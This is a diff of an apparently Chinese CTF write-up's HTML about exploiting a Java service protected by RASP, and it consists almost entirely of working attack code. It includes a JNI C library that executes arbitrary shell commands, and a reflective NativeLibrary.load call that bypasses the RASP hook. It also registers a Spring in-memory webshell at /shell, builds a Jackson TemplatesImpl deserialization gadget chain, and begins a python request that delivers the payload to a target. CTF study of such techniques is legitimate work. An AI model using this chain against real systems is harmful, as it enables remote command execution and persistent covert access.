+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119164847556.png" srcset="/img/loading.gif" lazyload alt="image-20231119164847556"></p>
+<p>我们通过分析<code>System.load</code>方法，会发现比<code>loadLibrary0</code>还要底层的是<code>NativeLibrary</code>的<code>load</code>方法，我们反射调用它即可绕过</p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119155237308.png" srcset="/img/loading.gif" lazyload alt="image-20231119155237308"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119154915494.png" srcset="/img/loading.gif" lazyload alt="image-20231119154915494"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119155007555.png" srcset="/img/loading.gif" lazyload alt="image-20231119155007555"></p>
+<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span></span>&#123;
+    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd); 
 &#125;</code></pre></div>
 
-<p>在当前目录运行</p>
-<div class="code-wrapper"><pre><code class="hljs shell">javac EvilClass.java
-javah EvilClass</code></pre></div>
 
-<p>生成 EvilClass.h 文件如下</p>
-<div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span>
+
+<div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>.\Cmdclass.<span class="hljs-keyword">java</span>
+<span class="hljs-keyword"></span>
+<span class="hljs-keyword">javac </span>-cp . .\Cmdclass.<span class="hljs-keyword">java </span>-h <span class="hljs-keyword">jackson.Cmdclass</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span>
-<span class="hljs-comment">/* Header for class EvilClass */</span>
+<span class="hljs-comment">/* Header for class jackson_Cmdclass */</span>
 
-<span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_EvilClass</span>
-<span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_EvilClass</span>
+<span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_jackson_Cmdclass</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_jackson_Cmdclass</span>
 <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>
 <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;
 <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
 <span class="hljs-comment">/*</span>
-<span class="hljs-comment"> * Class:     EvilClass</span>
+<span class="hljs-comment"> * Class:     jackson_Cmdclass</span>
 <span class="hljs-comment"> * Method:    execCmd</span>
 <span class="hljs-comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span>
 <span class="hljs-comment"> */</span>
-JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_execCmd</span>
-  <span class="hljs-params">(JNIEnv *, jclass, jstring)</span>;
+<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span></span>
+<span class="hljs-function">  <span class="hljs-params">(JNIEnv *, jobject, jstring)</span></span>;
 
 <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>
 &#125;
 <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span></code></pre></div>
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+</code></pre></div>
 
-<p>根据EvilClass.h文件编写EvilClass.c文件</p>
-<p>EvilClass.c</p>
-<div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<p>参照头文件写恶意c文件，包含头文件</p>
+<div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jackson_Cmdclass.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;EvilClass.h&quot;</span></span>
 
-<span class="hljs-type">int</span> <span class="hljs-title function_">execmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span>
-&#123;
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execCmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span></span>
+<span class="hljs-function"></span>&#123;
     <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];              <span class="hljs-comment">//定义缓冲区</span>
-    FILE *pipe = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">//打开管道，并执行命令</span>
+    FILE *pipe = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">//打开管道，并执行命令</span>
     <span class="hljs-keyword">if</span> (!pipe)
         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//返回0表示运行失败</span>
 
-    <span class="hljs-keyword">while</span> (!feof(pipe))
+    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">feof</span>(pipe))
     &#123;
-        <span class="hljs-keyword">if</span> (fgets(buffer, <span class="hljs-number">128</span>, pipe))
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fgets</span>(buffer, <span class="hljs-number">128</span>, pipe))
         &#123; <span class="hljs-comment">//将管道输出到result中</span>
             <span class="hljs-built_in">strcat</span>(result, buffer);
         &#125;
     &#125;
-    pclose(pipe); <span class="hljs-comment">//关闭管道</span>
+    <span class="hljs-built_in">pclose</span>(pipe); <span class="hljs-comment">//关闭管道</span>
     <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">//返回1表示运行成功</span>
 &#125;
-JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_execCmd</span><span class="hljs-params">(JNIEnv *env, jclass class_object, jstring jstr)</span>
-&#123;
+<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span></span>
+<span class="hljs-function"></span>&#123;
 
-    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(env, jstr, <span class="hljs-literal">NULL</span>);
     <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义存放结果的字符串数组</span>
-    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == execmd(cstr, result))
+    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == <span class="hljs-built_in">execCmd</span>(cstr, result))
     &#123;
        <span class="hljs-comment">// printf(result);</span>
     &#125;
 
     <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;
     <span class="hljs-built_in">strcat</span>(return_messge, result);
-    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);
+    jstring cmdresult = (*env)-&gt;<span class="hljs-built_in">NewStringUTF</span>(env, return_messge);
     <span class="hljs-comment">//system();</span>
 
     <span class="hljs-keyword">return</span> cmdresult;
 &#125;</code></pre></div>
 
-<p>编译生成对应动态链接库文件</p>
+
+
 <div class="code-wrapper"><pre><code class="hljs shell">gcc -fPIC -I $JAVA_HOME/include  -I $JAVA_HOME/include/linux -shared -o libcmd.so EvilClass.c</code></pre></div>
 
 <p>将该so文件base64编码放到java代码中方便加载</p>
-<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> java.io.FileNotFoundException;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.RandomAccessFile;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetJNIBase64</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\fsdownload\\libcmd.so&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+            <span class="hljs-type">byte</span>[] content = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) r.length()];
+            r.read(content);
+            <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(content);
+            System.out.println(s);
+            r.close();
+        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>利用 TemplateImpl 来执行java代码，这里和内存马直接就放一起了</p>
+<p>注意！！！这个内存马的包名和上面我们的cmdClass必须全部对应，否则就会报错（Boogipop大佬是这样说的）        （跟我上面说的包名一致好像差不多）</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
 <span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
 <span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 <span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
@@ -1264,11 +1516,11 @@ JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_exec
 <span class="hljs-keyword">import</span> java.util.Base64;
 <span class="hljs-keyword">import</span> java.util.Vector;
 
-<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cmdclass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;
 
     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">execCmd</span><span class="hljs-params">(String cmd)</span>;
     <span class="hljs-comment">//恶意动态链接库文件的base64编码</span>
-    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EVIL_JNI_BASE64</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;。。。。&quot;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EVIL_JNI_BASE64</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.......&quot;</span>;
     <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LIB_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/libcmd.so&quot;</span>;
 
     <span class="hljs-keyword">static</span> &#123;
@@ -1279,7 +1531,7 @@ JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_exec
             randomAccessFile.close();
 
             <span class="hljs-comment">//调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库</span>
-            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cmdLoader</span> <span class="hljs-operator">=</span> EvilClass.class.getClassLoader();
+            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cmdLoader</span> <span class="hljs-operator">=</span> Cmdclass.class.getClassLoader();
             Class&lt;?&gt; classLoaderClazz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);
             Class&lt;?&gt; nativeLibraryClazz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader$NativeLibrary&quot;</span>);
             <span class="hljs-type">Method</span> <span class="hljs-variable">load</span> <span class="hljs-operator">=</span> nativeLibraryClazz.getDeclaredMethod(<span class="hljs-string">&quot;load&quot;</span>, String.class, <span class="hljs-type">boolean</span>.class);
@@ -1289,7 +1541,7 @@ JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_exec
             Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);
             Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, <span class="hljs-type">boolean</span>.class);
             nativeLibraryCons.setAccessible(<span class="hljs-literal">true</span>);
-            <span class="hljs-type">Object</span> <span class="hljs-variable">nativeLibraryObj</span> <span class="hljs-operator">=</span> nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, <span class="hljs-literal">false</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">nativeLibraryObj</span> <span class="hljs-operator">=</span> nativeLibraryCons.newInstance(Cmdclass.class, LIB_PATH, <span class="hljs-literal">false</span>);
             libs.addElement(nativeLibraryObj);
             field.set(cmdLoader, libs);
             load.invoke(nativeLibraryObj, LIB_PATH, <span class="hljs-literal">false</span>);
@@ -1301,11 +1553,11 @@ JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_exec
             configField.setAccessible(<span class="hljs-literal">true</span>);
             RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span>
                     (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
-            <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> EvilClass.class.getMethod(<span class="hljs-string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);
+            <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> Cmdclass.class.getMethod(<span class="hljs-string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);
             <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>)
                     .options(config)
                     .build();
-            <span class="hljs-type">EvilClass</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilClass</span>();
+            <span class="hljs-type">Cmdclass</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmdclass</span>();
             mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
 
         &#125; <span class="hljs-keyword">catch</span> (Exception hi) &#123;
@@ -1317,7 +1569,7 @@ JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_exec
 
         <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);
         <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;
-            <span class="hljs-type">String</span> <span class="hljs-variable">execRes</span> <span class="hljs-operator">=</span> EvilClass.execCmd(cmd);
+            <span class="hljs-type">String</span> <span class="hljs-variable">execRes</span> <span class="hljs-operator">=</span> Cmdclass.execCmd(cmd);
             response.getWriter().write(execRes);
             response.getWriter().flush();
         &#125;
@@ -1334,62 +1586,81 @@ JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_exec
     &#125;
 &#125;</code></pre></div>
 
-<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<p>jackson记得老规矩重写<code>BaseJsonNode</code>删掉<code>writeReplace</code>方法</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
 <span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;
 <span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-<span class="hljs-keyword">import</span> javassist.*;
-<span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;
+<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
+<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;
+
 <span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
 <span class="hljs-keyword">import</span> javax.xml.transform.Templates;
 <span class="hljs-keyword">import</span> java.io.*;
-<span class="hljs-keyword">import</span> java.lang.reflect.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.net.URI;
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.security.*;
+<span class="hljs-keyword">import</span> java.sql.SQLOutput;
 <span class="hljs-keyword">import</span> java.util.Base64;
 
-<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Poc0</span> &#123;
-
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;
     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
 
-        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();
-        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);
-        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);
-        ctClass0.removeMethod(writeReplace);
-        ctClass0.toClass();
+        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
 
-        <span class="hljs-type">byte</span>[] bytes = Repository.lookupClass(EvilClass.class).getBytes();
+        <span class="hljs-type">byte</span>[] bytecodes = Repository.lookupClass(Cmdclass.class).getBytes();
+        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);
+        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);
+        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">//</span>
+        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);
+<span class="hljs-comment">//</span>
+        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);
 
-        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
-        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);
-        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);
-        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);
-        <span class="hljs-comment">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span>
-        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);
-        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
-        cons.setAccessible(<span class="hljs-literal">true</span>);
-        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();
-        advisedSupport.setTarget(templatesImpl);
-        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);
-        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);
-        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);
+        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);
 
-        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);
-        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);
-        val.setAccessible(<span class="hljs-literal">true</span>);
-        val.set(exp,jsonNodes);
-
-        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
-        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);
-        objectOutputStream.writeObject(exp);
-        objectOutputStream.close();
-        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(barr.toByteArray());
-        System.out.println(res);
+        System.out.println(serial(exp));
 
     &#125;
-    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;
-        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);
-        f.setAccessible(<span class="hljs-literal">true</span>);
-        f.set(obj, arg);
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
     &#125;
-&#125;</code></pre></div>
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+
+&#125;
+</code></pre></div>
 
 <div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 
@@ -1397,15 +1668,25 @@ JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_EvilClass_exec
 baseUrl = <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx&quot;</span>
 burp0_url = baseUrl + <span class="hljs-string">&quot;/read&quot;</span>
 burp0_headers = &#123;<span class="hljs-string">&quot;Transfer-Encoding&quot;</span>: <span class="hljs-string">&quot;chunked&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/plain&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;
